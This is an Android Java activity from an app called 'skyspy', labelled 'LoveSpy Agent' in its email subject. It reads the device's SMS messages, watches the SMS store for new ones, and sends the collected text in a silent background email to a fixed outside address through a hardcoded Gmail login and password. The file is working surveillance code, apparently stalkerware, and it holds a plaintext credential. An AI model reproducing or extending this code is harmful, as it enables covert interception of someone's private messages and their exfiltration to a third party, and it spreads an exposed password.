package com.example.skyspy.app.ui;

import android.app.Activity;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import com.example.skyspy.app.R;
import com.example.skyspy.app.email.EmailSending;
import com.example.skyspy.app.network.NetworkUpdateReceiver;
import com.example.skyspy.app.sms.SmsReader;
import com.example.skyspy.app.sms.SmsSentObserver;
import com.example.skyspy.app.network.NetworkStatus;
import com.example.skyspy.app.utils.Utils;

import java.util.ArrayList;

public class SmsActivity extends Activity{

    private EmailSending mEmailSending;
    private String mLetter;
    private SmsSentObserver mSmsSentObserver;
    private static final Uri STATUS_URI = Uri.parse("content://sms");
    private ArrayList<String> mSuspendedLetterList = new ArrayList<String>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.sms_list);
        SmsReader smsReader = new SmsReader(this);
        mLetter = smsReader.getSmsList();
        mSmsSentObserver = new SmsSentObserver(new Handler(), this);
        getContentResolver().registerContentObserver(STATUS_URI, true, mSmsSentObserver);
        ListView listView = (ListView) findViewById(R.id.listView);
        String[] items = {mLetter};
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, items);
        listView.setAdapter(adapter);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.sms_menu, menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.send_message_via_chooser:
                EmailSending.sendViaChooser(this);
                return true;
            case R.id.send_message_silently:
                new AsyncTask<Void,Void,Void>() {
                    @Override
                    protected Void doInBackground(Void... voids) {
                        sendEmailSilently();
                        return null;
                    }
                }.execute();
            default:
        }
        return super.onOptionsItemSelected(item);
    }

    public void sendEmailSilently() {
        mEmailSending = new EmailSending("o.kapustiyan@gmail.com", "samsungforever");
        String[] toArr = {"1eecooper@ukr.net"};
        mEmailSending.setTo(toArr);
        mEmailSending.setFrom("wooo@wooo.com");
        mEmailSending.setSubject("[Sms] LoveSpy Agent");
        try {
            if (NetworkStatus.getInstance(this).isOnline()) {
                if (mEmailSending.sendSilently(mLetter)) {
                    runToastOnUiThread("Email was sent successfully.", Toast.LENGTH_LONG);
                } else {
                    runToastOnUiThread("Email was not sent.", Toast.LENGTH_LONG);
                }
            } else {
                mSuspendedLetterList.add(mLetter);
                NetworkUpdateReceiver.setLetterList(mSuspendedLetterList);
            }
        } catch(Exception e) {
            Log.e(Utils.TAG, "Could not send email", e);
        }
    }

    public void runToastOnUiThread(final String text, final int length) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(SmsActivity.this, text, length).show();
            }
        });
    }
}
